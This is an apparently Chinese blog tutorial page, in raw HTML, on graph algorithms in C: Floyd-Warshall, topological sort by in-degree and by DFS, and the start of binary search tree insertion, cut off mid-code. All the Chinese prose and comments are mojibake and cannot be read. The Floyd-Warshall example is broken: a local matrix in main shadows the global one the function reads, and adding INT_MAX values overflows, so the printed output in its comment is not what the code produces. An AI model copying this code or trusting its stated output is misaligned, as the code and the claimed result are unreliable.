30</span><br><span class="hljs-comment">4  70</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p> Floyd-Warshall ç®—æ³•</p><p>Floyd-Warshall ç®—æ³•çš„æ­¥éª¤ï¼š</p><ol><li>åˆå§‹åŒ–ä¸€ä¸ªè·ç¦»çŸ©é˜µ <code>dist[][]</code>ï¼Œå°†æ‰€æœ‰è¾¹çš„æƒå€¼èµ‹ç»™ç›¸åº”ä½ç½®ã€‚å¦‚æœæ²¡æœ‰è¾¹ï¼Œèµ‹å€¼ä¸ºæ— é™å¤§ã€‚</li><li>å¯¹äºæ¯ä¸€å¯¹é¡¶ç‚¹ i,ji, ji,jï¼Œæ£€æŸ¥æ˜¯å¦æœ‰ä¸€ä¸ªä¸­é—´é¡¶ç‚¹ kkkï¼Œä½¿å¾—é€šè¿‡ kkk è¾¾åˆ° jjj çš„è·¯å¾„æ¯”ç›´æ¥ä» iii åˆ° jjj çš„è·¯å¾„æ›´çŸ­ã€‚å¦‚æœæ˜¯ï¼Œåˆ™æ›´æ–° <code>dist[i][j]</code>ã€‚</li><li>é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°æ‰¾åˆ°æ‰€æœ‰é¡¶ç‚¹å¯¹çš„æœ€çŸ­è·¯å¾„ã€‚</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INF INT_MAX</span><br><br><span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES];  <span class="hljs-comment">// é‚»æ¥çŸ©é˜µ</span><br><br><span class="hljs-comment">// Floyd-Warshall ç®—æ³•</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">floydWarshall</span><span class="hljs-params">(<span class="hljs-type">int</span> numVertices)</span> </span>&#123;<br>    <span class="hljs-type">int</span> dist[MAX_VERTICES][MAX_VERTICES];<br><br>    <span class="hljs-comment">// åˆå§‹åŒ–è·ç¦»çŸ©é˜µ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; numVertices; j++) &#123;<br>            <span class="hljs-keyword">if</span> (i == j)<br>                dist[i][j] = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (graph[i][j])<br>                dist[i][j] = graph[i][j];<br>            <span class="hljs-keyword">else</span><br>                dist[i][j] = INF;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// åŠ¨æ€è§„åˆ’è®¡ç®—æœ€çŸ­è·¯å¾„</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; numVertices; k++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; numVertices; j++) &#123;<br>                <span class="hljs-keyword">if</span> (dist[i][j] &gt; dist[i][k] + dist[k][j]) &#123;<br>                    dist[i][j] = dist[i][k] + dist[k][j];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// æ‰“å°æœ€ç»ˆçš„æœ€çŸ­è·¯å¾„çŸ©é˜µ</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Shortest distances between every pair of vertices:\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; numVertices; j++) &#123;<br>            <span class="hljs-keyword">if</span> (dist[i][j] == INF)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INF &quot;</span>);<br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, dist[i][j]);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> numVertices = <span class="hljs-number">4</span>;<br><br>    <span class="hljs-comment">// ç¤ºä¾‹å›¾çš„é‚»æ¥çŸ©é˜µè¡¨ç¤º</span><br>    <span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES] = &#123;<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, INF, INF&#125;,<br>        &#123;<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, INF&#125;,<br>        &#123;INF, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>&#125;,<br>        &#123;INF, INF, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>&#125;<br>    &#125;;<br><br>    <span class="hljs-built_in">floydWarshall</span>(numVertices);  <span class="hljs-comment">// è®¡ç®—æ‰€æœ‰é¡¶ç‚¹å¯¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*Shortest distances between every pair of vertices:</span><br><span class="hljs-comment">0 3 4 8 </span><br><span class="hljs-comment">3 0 1 4 </span><br><span class="hljs-comment">4 1 0 5 </span><br><span class="hljs-comment">8 4 5 0 </span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h4 id="AOVç½‘å’Œæ‹“æ‰‘æ’åº"><a href="#AOVç½‘å’Œæ‹“æ‰‘æ’åº" class="headerlink" title="AOVç½‘å’Œæ‹“æ‰‘æ’åº"></a>AOVç½‘å’Œæ‹“æ‰‘æ’åº</h4><p>å…¥åº¦æ³•</p><p><strong>æ€è·¯</strong>ï¼š</p><ol><li>è®¡ç®—æ‰€æœ‰èŠ‚ç‚¹çš„å…¥åº¦ã€‚</li><li>å°†å…¥åº¦ä¸º 0 çš„èŠ‚ç‚¹åŠ å…¥é˜Ÿåˆ—ã€‚</li><li>ä»é˜Ÿåˆ—ä¸­å–å‡ºä¸€ä¸ªèŠ‚ç‚¹ï¼ŒåŠ å…¥æ’åºç»“æœä¸­ï¼Œå¹¶å‡å°‘å®ƒçš„é‚»æ¥èŠ‚ç‚¹çš„å…¥åº¦ã€‚</li><li>å¦‚æœé‚»æ¥èŠ‚ç‚¹çš„å…¥åº¦å˜ä¸º 0ï¼Œåˆ™å°†å…¶åŠ å…¥é˜Ÿåˆ—ã€‚</li><li>ç»§ç»­è¿™ä¸ªè¿‡ç¨‹ï¼Œç›´åˆ°æ‰€æœ‰èŠ‚ç‚¹éƒ½è¢«å¤„ç†ã€‚å¦‚æœå¤„ç†å®Œåè¿˜æœ‰èŠ‚ç‚¹æ²¡æœ‰åŠ å…¥æ’åºç»“æœï¼Œè¯´æ˜å›¾ä¸­å­˜åœ¨ç¯ã€‚</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><br><span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES]; <span class="hljs-comment">// é‚»æ¥çŸ©é˜µè¡¨ç¤ºå›¾</span><br><span class="hljs-type">int</span> inDegree[MAX_VERTICES];            <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªèŠ‚ç‚¹çš„å…¥åº¦</span><br><span class="hljs-type">int</span> numVertices;                       <span class="hljs-comment">// å›¾çš„é¡¶ç‚¹æ•°</span><br><br><span class="hljs-comment">// å…¥åº¦æ³•å®ç°æ‹“æ‰‘æ’åº</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">topologicalSort</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> queue[MAX_VERTICES], front = <span class="hljs-number">0</span>, rear = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// å°†å…¥åº¦ä¸º 0 çš„èŠ‚ç‚¹åŠ å…¥é˜Ÿåˆ—</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-keyword">if</span> (inDegree[i] == <span class="hljs-number">0</span>) &#123;<br>            queue[rear++] = i;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// è®°å½•å·²æ’åºçš„é¡¶ç‚¹æ•°é‡</span><br>    <span class="hljs-type">int</span> sortedCount = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">while</span> (front &lt; rear) &#123;<br>        <span class="hljs-type">int</span> u = queue[front++];  <span class="hljs-comment">// å–å‡ºä¸€ä¸ªèŠ‚ç‚¹</span><br>        <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, u);        <span class="hljs-comment">// è¾“å‡ºå½“å‰èŠ‚ç‚¹ï¼ˆåŠ å…¥æ‹“æ‰‘æ’åºç»“æœï¼‰</span><br>        sortedCount++;<br>        <br>        <span class="hljs-comment">// å‡å°‘ä¸è¯¥èŠ‚ç‚¹ç›¸é‚»çš„é¡¶ç‚¹çš„å…¥åº¦</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v = <span class="hljs-number">0</span>; v &lt; numVertices; v++) &#123;<br>            <span class="hljs-keyword">if</span> (graph[u][v] == <span class="hljs-number">1</span>) &#123;<br>                inDegree[v]--;<br>                <span class="hljs-keyword">if</span> (inDegree[v] == <span class="hljs-number">0</span>) &#123;<br>                    queue[rear++] = v;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// å¦‚æœæ‰€æœ‰èŠ‚ç‚¹éƒ½å·²æ’åºï¼Œåˆ™å›¾æ˜¯DAGï¼Œå¦åˆ™å­˜åœ¨ç¯</span><br>    <span class="hljs-keyword">if</span> (sortedCount != numVertices) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nå›¾ä¸­å­˜åœ¨ç¯ï¼Œæ— æ³•è¿›è¡Œæ‹“æ‰‘æ’åºã€‚\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    numVertices = <span class="hljs-number">6</span>;  <span class="hljs-comment">// å›¾çš„é¡¶ç‚¹æ•°</span><br><br>    <span class="hljs-comment">// æ„å»ºç¤ºä¾‹å›¾ï¼ˆé‚»æ¥çŸ©é˜µè¡¨ç¤ºï¼‰</span><br>    <span class="hljs-type">int</span> g[MAX_VERTICES][MAX_VERTICES] = &#123;<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;<br>    &#125;;<br>    <br>    <span class="hljs-comment">// å°†é‚»æ¥çŸ©é˜µèµ‹å€¼ç»™å›¾</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; numVertices; j++) &#123;<br>            graph[i][j] = g[i][j];<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// åˆå§‹åŒ–å…¥åº¦æ•°ç»„</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        inDegree[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; numVertices; j++) &#123;<br>            <span class="hljs-keyword">if</span> (graph[j][i] == <span class="hljs-number">1</span>) &#123;<br>                inDegree[i]++;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‹“æ‰‘æ’åºç»“æœï¼š\n&quot;</span>);<br>    <span class="hljs-built_in">topologicalSort</span>();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*æ‹“æ‰‘æ’åºç»“æœï¼š</span><br><span class="hljs-comment">0 1 2 3 4 5 </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p>æ·±åº¦ä¼˜å…ˆæœç´¢æ³•å®ç°æ‹“æ‰‘æ’åº</p><p>å¯¹å›¾è¿›è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰ã€‚</p><p>åœ¨å›æº¯è¿‡ç¨‹ä¸­ï¼Œå°†èŠ‚ç‚¹å‹å…¥æ ˆä¸­ã€‚</p><p>æœ€ç»ˆæ ˆä¸­çš„èŠ‚ç‚¹é¡ºåºå³ä¸ºæ‹“æ‰‘æ’åºçš„ç»“æœï¼ˆæ ˆé¡¶åˆ°æ ˆåº•ï¼‰ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><br><span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES]; <span class="hljs-comment">// é‚»æ¥çŸ©é˜µè¡¨ç¤ºå›¾</span><br><span class="hljs-type">bool</span> visited[MAX_VERTICES];            <span class="hljs-comment">// è®°å½•èŠ‚ç‚¹æ˜¯å¦è¢«è®¿é—®</span><br><span class="hljs-type">int</span> numVertices;                       <span class="hljs-comment">// å›¾çš„é¡¶ç‚¹æ•°</span><br><br><span class="hljs-comment">// é€’å½’æ·±åº¦ä¼˜å…ˆæœç´¢</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> stack[], <span class="hljs-type">int</span> *top)</span> </span>&#123;<br>    visited[u] = <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-comment">// è®¿é—®æ‰€æœ‰é‚»æ¥èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v = <span class="hljs-number">0</span>; v &lt; numVertices; v++) &#123;<br>        <span class="hljs-keyword">if</span> (graph[u][v] == <span class="hljs-number">1</span> &amp;&amp; !visited[v]) &#123;<br>            <span class="hljs-built_in">dfs</span>(v, stack, top);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// å°†èŠ‚ç‚¹åŠ å…¥æ ˆ</span><br>    stack[(*top)++] = u;<br>&#125;<br><br><span class="hljs-comment">// æ·±åº¦ä¼˜å…ˆæœç´¢æ³•å®ç°æ‹“æ‰‘æ’åº</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">topologicalSort</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> stack[MAX_VERTICES];<br>    <span class="hljs-type">int</span> top = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// åˆå§‹åŒ–è®¿é—®æ ‡è®°</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        visited[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// å¯¹æ¯ä¸ªæœªè®¿é—®çš„èŠ‚ç‚¹è¿›è¡ŒDFSéå†</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-keyword">if</span> (!visited[i]) &#123;<br>            <span class="hljs-built_in">dfs</span>(i, stack, &amp;top);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// æ‰“å°æ‹“æ‰‘æ’åºç»“æœï¼ˆæ ˆä¸­çš„é¡ºåºï¼‰</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‹“æ‰‘æ’åºç»“æœï¼š\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = top - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, stack[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    numVertices = <span class="hljs-number">6</span>;  <span class="hljs-comment">// å›¾çš„é¡¶ç‚¹æ•°</span><br><br>    <span class="hljs-comment">// æ„å»ºç¤ºä¾‹å›¾ï¼ˆé‚»æ¥çŸ©é˜µè¡¨ç¤ºï¼‰</span><br>    <span class="hljs-type">int</span> g[MAX_VERTICES][MAX_VERTICES] = &#123;<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;<br>    &#125;;<br>    <br>    <span class="hljs-comment">// å°†é‚»æ¥çŸ©é˜µèµ‹å€¼ç»™å›¾</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; numVertices; j++) &#123;<br>            graph[i][j] = g[i][j];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">topologicalSort</span>();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>å›¾</strong>æ˜¯ä¸€ç§é‡è¦çš„æ•°æ®ç»“æ„ï¼Œä¸»è¦ç”¨äºè¡¨ç¤ºå¯¹è±¡ä¹‹é—´çš„å…³ç³»ï¼Œå¯ä»¥åˆ†ä¸ºæœ‰å‘å›¾å’Œæ— å‘å›¾ã€‚</p><p>åœ¨Cè¯­è¨€ä¸­ï¼Œå›¾é€šå¸¸ä½¿ç”¨<strong>é‚»æ¥çŸ©é˜µ</strong>æˆ–<strong>é‚»æ¥è¡¨</strong>æ¥è¡¨ç¤ºï¼Œé‚»æ¥çŸ©é˜µé€‚ç”¨äº<strong>ç¨ å¯†å›¾</strong>ï¼Œé‚»æ¥è¡¨é€‚ç”¨äº<strong>ç¨€ç–å›¾</strong>ã€‚</p><p>å¸¸è§çš„å›¾æ“ä½œåŒ…æ‹¬<strong>æ·±åº¦ä¼˜å…ˆéå†ï¼ˆDFSï¼‰</strong>ã€<strong>å¹¿åº¦ä¼˜å…ˆéå†ï¼ˆBFSï¼‰</strong>ã€æ±‚æœ€çŸ­è·¯å¾„ã€è¿é€šæ€§ç­‰ã€‚</p><p>é€‰æ‹©åˆé€‚çš„å›¾è¡¨ç¤ºæ–¹å¼å’Œéå†æ–¹æ³•å¯ä»¥æé«˜ç¨‹åºçš„æ•ˆç‡å’Œå¯è¯»æ€§ã€‚</p><p>æ’åº</p><p>äºŒå‰æ’åºæ ‘</p><p>æ’å…¥æ“ä½œï¼ˆInsertï¼‰</p><p>æ’å…¥æ“ä½œçš„ç›®çš„æ˜¯å°†æ–°èŠ‚ç‚¹æ’å…¥åˆ°æ ‘ä¸­çš„åˆé€‚ä½ç½®ã€‚æ’å…¥è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œæ¯”è¾ƒè¦æ’å…¥çš„å€¼ä¸å½“å‰èŠ‚ç‚¹çš„å€¼ã€‚</li><li>å¦‚æœæ–°å€¼å°äºå½“å‰èŠ‚ç‚¹çš„å€¼ï¼Œåˆ™é€’å½’æ’å…¥åˆ°å·¦å­æ ‘ï¼›å¦‚æœæ–°å€¼å¤§äºå½“å‰èŠ‚ç‚¹çš„å€¼ï¼Œåˆ™é€’å½’æ’å…¥åˆ°å³å­æ ‘ã€‚</li><li>å¦‚æœå½“å‰èŠ‚ç‚¹çš„å·¦å­æ ‘æˆ–å³å­æ ‘ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ’å…¥èŠ‚ç‚¹ã€‚</li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xl">typedef struct TreeNode &#123;<br>    int <span class="hljs-keyword">data</span>;<br>    struct TreeNode *left, *right;<br>&#125; TreeNode;<br><br>TreeNode* insert(TreeNode* root, int value) &#123;<br>    <span class="hljs-keyword">if</span> (root == NULL) &#123;<br>        TreeNode* newNode = (TreeNode*)malloc(sizeof(TreeNode));<br>        <span class="hljs-function"><span class="hljs-title">newNode</span>-&gt;</span><span class="hljs-keyword">data</span> = value;<br>        <span class="hljs-function"><span class="hljs-title">newNode</span>-&gt;</span><span 